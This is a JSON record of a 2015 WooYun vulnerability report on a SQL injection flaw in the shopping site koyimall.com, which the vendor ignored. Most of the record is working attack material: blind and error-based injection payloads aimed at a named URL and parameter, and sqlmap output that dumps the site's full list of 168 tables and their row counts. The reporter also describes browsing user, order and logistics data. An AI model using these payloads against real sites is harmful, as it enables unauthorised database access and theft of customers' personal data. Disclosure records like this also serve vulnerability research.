{"id": 24644, "wybug_id": "wooyun-2015-0139388", "wybug_title": "韩尚聚某站sql注入泄露全站信息(十几万用户)", "wybug_corp": "koyimall.com", "wybug_author": "日出东方", "wybug_date": "2015-09-07 09:42", "wybug_open_date": "2015-09-12 09:44", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-12：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： biu biu biu  详细说明：  \nhttp://m.koyimall.com/?act=shop.goods_list&GC=GD00&oc=good_buy_total&os=desc&page=4&ST=SCODE3&mode=\n参数 os\nPayload: act=shop.goods_list&GC=GD00&oc=good_price RLIKE (SELECT (CASE WHEN(8230=8230) THEN 0x676f6f645f7072696365 ELSE 0x28 END))&os=desc&page=4&ST=SCODE3&mode=\n   漏洞证明：  sqlmap identified the following injection point(s) with a total of 469 HTTP(s) requests:---Parameter: oc (GET)    Type: boolean-based blind    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: act=shop.goods_list&GC=GD00&oc=good_price RLIKE (SELECT (CASE WHEN(8230=8230) THEN 0x676f6f645f7072696365 ELSE 0x28 END))&os=desc&page=4&ST=SCODE3&mode=    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: act=shop.goods_list&GC=GD00&oc=good_price AND (SELECT 4074 FROM(SELECT COUNT(*),CONCAT(0x7178766a71,(SELECT (ELT(4074=4074,1))),0x7176767171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)&os=desc&page=4&ST=SCODE3&mode=---[19:37:43] [INFO] the back-end DBMS is MySQLweb application technology: Nginx, PHP 5.2.5back-end DBMS: MySQL 5.0current database:    'koyimall'current user:    'koyimall@%'Database: koyimall[168 tables]+---------------------------------+| alipay_login                    || durian_admin                    || durian_admin_auth               || durian_admin_login              || durian_admin_memo               || durian_admin_menu               || durian_admin_postit             || durian_bank                     || durian_banner                   || durian_banner_click             || durian_bbs_category             || durian_bbs_comment              || durian_bbs_data                 || durian_bbs_file                 || durian_bbs_setup                || durian_bbs_vote                 || durian_buy                      || durian_buy_bill                 || durian_buy_change_log           || durian_buy_claim                || durian_buy_claim_goods          || durian_buy_excel                || durian_buy_excel_ext            || durian_buy_ext                  || durian_buy_ext_set              || durian_buy_goods                || durian_buy_goods_status_log     || durian_buy_recommend            || durian_buy_stat                 || durian_calendar                 || durian_cart                     || durian_country                  || durian_coupon                   || durian_coupon_data              || durian_coupon_file              || durian_coupon_goods             || durian_coupon_goods_give        || durian_coupon_log               || durian_coupon_policy            || durian_customer_qna             || durian_customer_qna_category    || durian_customer_qna_reply       || durian_delivery_area            || durian_delivery_company         || durian_delivery_cost            || durian_delivery_cost_area       || durian_delivery_extra           || durian_delivery_policy          || durian_delivery_policy_range    || durian_design_flash             || durian_design_font              || durian_design_keyword           || durian_design_layout            || durian_design_module            || durian_design_module_current    || durian_design_module_reserve    || durian_design_module_set        || durian_design_module_set_bbs    || durian_design_module_set_data   || durian_design_page              || durian_design_policy            || durian_design_source            || durian_design_tpl               || durian_estimate                 || durian_estimate_goods           || durian_event                    || durian_event_goods              || durian_form_category            || durian_form_data                || durian_form_set                 || durian_form_setup               || durian_good_brand               || durian_good_category            || durian_good_category_multi      || durian_good_category_related    || durian_good_category_style      || durian_good_category_taobao     || durian_good_check_option        || durian_good_extend              || durian_good_fabric_tip          || durian_good_fabric_tip_title    || durian_good_file                || durian_good_main                || durian_good_main_list           || durian_good_maker               || durian_good_option_grid         || durian_good_option_grid_value   || durian_good_option_set          || durian_good_option_set_list     || durian_good_option_set_value    || durian_good_option_single       || durian_good_option_single_value || durian_good_policy              || durian_good_related             || durian_good_stat                || durian_good_tmp                 || durian_good_view                || durian_goods                    || durian_icon                     || durian_icon_group               || durian_keyword                  || durian_keyword_stat             || durian_mail_auto                || durian_mail_policy              || durian_mail_result              || durian_mail_send                || durian_mail_tpl                 || durian_mail_tpl_category        || durian_market_group             || durian_market_group_log         || durian_memo_policy              || durian_memo_recv                || durian_memo_send                || durian_memo_tpl                 || durian_mileage_log              || durian_mileage_pay              || durian_mileage_policy           || durian_pay                      || durian_point_log                || durian_point_policy             || durian_poll                     || durian_poll_answer              || durian_poll_comment             || durian_poll_vote                || durian_popup                    || durian_popup_tpl                || durian_redbean                  || durian_sf_barcode               || durian_shop                     || durian_shop_account             || durian_shop_company             || durian_shop_domain              || durian_shop_policy              || durian_sms_auto                 || durian_sms_policy               || durian_sms_result               || durian_sms_send                 || durian_sms_tpl                  || durian_sms_tpl_category         || durian_stat_check               || durian_talk                     || durian_talk_policy              || durian_user                     || durian_user_address             || durian_user_deny                || durian_user_join_ext            || durian_user_join_policy         || durian_user_level               || durian_user_levelup_log         || durian_user_login               || durian_user_privacy             || durian_user_provision           || durian_user_recommend           || durian_user_secede              || durian_user_secede_poll         || durian_user_secede_poll_data    || durian_user_stat                || durian_wish_list                || durian_zipcode                  || gmay_gift_event                 || main_banner_info                || main_banner_prd_info            || main_plan_info                  || main_ranking_info               || pay_alipay_return               || pay_mileage_return              || ranking_info                    || ranking_temp_info               |+---------------------------------++---------------------------------+---------+| Table                           | Entries |+---------------------------------+---------+| durian_keyword_stat             | 221556  || durian_good_fabric_tip          | 170991  || durian_mail_result              | 141431  || durian_user_login               | 136143  || durian_good_option_single_value | 134240  || durian_good_file                | 108693  || durian_buy_goods                | 86863   || durian_sms_send                 | 80096   || durian_sms_result               | 80027   || durian_buy_goods_status_log     | 77237   || durian_good_option_single       | 70840   || durian_good_category_multi      | 70459   || durian_buy_change_log           | 62021   || durian_sf_barcode               | 58027   || durian_zipcode                  | 52038   || durian_admin_login              | 50249   || durian_pay                      | 50180   || durian_buy                      | 50169   || durian_mileage_log              | 45035   || durian_user_address             | 39630   || durian_goods                    | 34536   || durian_cart                     | 21801   || durian_buy_claim_goods          | 9796    || durian_buy_claim                | 8404    || durian_good_extend              | 7370    || durian_coupon_log               | 5418    || pay_mileage_return              | 4922    || durian_bbs_data                 | 4352    || durian_coupon_data              | 4306    || durian_user                     | 3981    || durian_user_stat                | 3980    || durian_delivery_area            | 3610    || durian_user_secede              | 3527    || durian_design_module_set_data   | 3002    || durian_mileage_pay              | 2932    || durian_good_view                | 2192    || durian_design_keyword           | 1883    || pay_alipay_return               | 1875    || durian_form_data                | 1732    || durian_design_tpl               | 903     || durian_buy_stat                 | 738     || durian_good_category            | 661     || durian_delivery_extra           | 635     || durian_good_option_grid_value   | 404     || durian_good_option_grid         | 388     || durian_admin_memo               | 348     || durian_good_category_taobao     | 333     || durian_admin_auth               | 219     || durian_design_module            | 178     || durian_admin                    | 109     || durian_user_recommend           | 105     || durian_delivery_cost_area       | 63      || durian_design_flash             | 59      || durian_buy_excel_ext            | 58      || durian_bbs_category             | 56      || durian_design_module_current    | 48      || durian_popup                    | 48      || durian_bbs_file                 | 43      || main_banner_info                | 43      || durian_design_module_set_bbs    | 35      || durian_coupon                   | 34      || durian_user_join_ext            | 34      || durian_user_secede_poll_data    | 34      || durian_bank                     | 31      || durian_shop_company             | 30      || durian_icon                     | 29      || gmay_gift_event                 | 29      || durian_redbean                  | 25      || durian_design_layout            | 23      || durian_coupon_goods             | 22      || durian_delivery_cost            | 21      || durian_mail_tpl                 | 21      || durian_mail_auto                | 20      || ranking_info                    | 20      || durian_sms_auto                 | 19      || durian_user_level               | 16      || main_ranking_info               | 14      || alipay_login                    | 13      || durian_bbs_setup                | 13      || durian_delivery_policy_range    | 11      || durian_admin_menu               | 10      || durian_buy_ext_set              | 10      || durian_event                    | 10      || durian_sms_tpl                  | 10      || ranking_temp_info               | 10      || durian_bbs_comment              | 9       || durian_good_fabric_tip_title    | 8       || durian_good_option_set_value    | 8       || durian_design_module_set        | 7       || durian_design_source            | 7       || durian_sms_tpl_category         | 7       || durian_good_category_style      | 6       || durian_market_group             | 6       || durian_country                  | 5       || durian_delivery_company         | 5       || durian_form_category            | 5       || durian_good_main                | 5       || durian_mail_tpl_category        | 5       || durian_user_deny                | 5       || durian_user_secede_poll         | 5       || durian_buy_bill                 | 4       || durian_delivery_policy          | 4       || durian_good_option_set          | 4       || durian_popup_tpl                | 3       || durian_shop_account             | 3       || durian_coupon_file              | 2       || durian_good_related             | 2       || durian_good_stat                | 2       || durian_icon_group               | 2       || durian_mail_send                | 2       || durian_user_privacy             | 2       || durian_user_provision           | 2       || durian_admin_postit             | 1       || durian_banner                   | 1       || durian_buy_excel                | 1       || durian_calendar                 | 1       || durian_coupon_policy            | 1       || durian_design_policy            | 1       || durian_form_set                 | 1       || durian_form_setup               | 1       || durian_good_check_option        | 1       || durian_good_policy              | 1       || durian_mail_policy              | 1       || durian_memo_policy              | 1       || durian_memo_recv                | 1       || durian_memo_send                | 1       || durian_mileage_policy           | 1       || durian_point_policy             | 1       || durian_poll                     | 1       || durian_shop                     | 1       || durian_shop_domain              | 1       || durian_shop_policy              | 1       || durian_sms_policy               | 1       || durian_stat_check               | 1       || durian_user_join_policy         | 1       |+---------------------------------+---------+全站用户信息。找找后台，瞧一瞧。订单信息\n\n物流信息\n\n没搞破坏，拒绝水表。厂商给点礼物呗。。。   修复方案：  你懂的   版权声明：转载请注明来源 日出东方@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-09-12 09:44 厂商回复：  漏洞Rank：4  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-09-07 09:43 |    \t\t日出东方 \t\t\t( 普通白帽子  |\t\t\t        Rank:161 漏洞数:51        )\t\t \n  @乌云小秘书 大哥这都不能给个首页吗？    \n     2015-09-07 10:40 |    \t\t乌云小秘书  \t\t\t( 普通白帽子  |\t\t\t        还没有发布任何漏洞        | 第1!绝对不意气用事!第2!绝对不漏判任何一...)\t\t \n  @日出东方 小厂商    \n     2015-09-07 10:46 |    \t\t日出东方 \t\t\t( 普通白帽子  |\t\t\t        Rank:161 漏洞数:51        )\t\t \n  @乌云小秘书  好吧    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}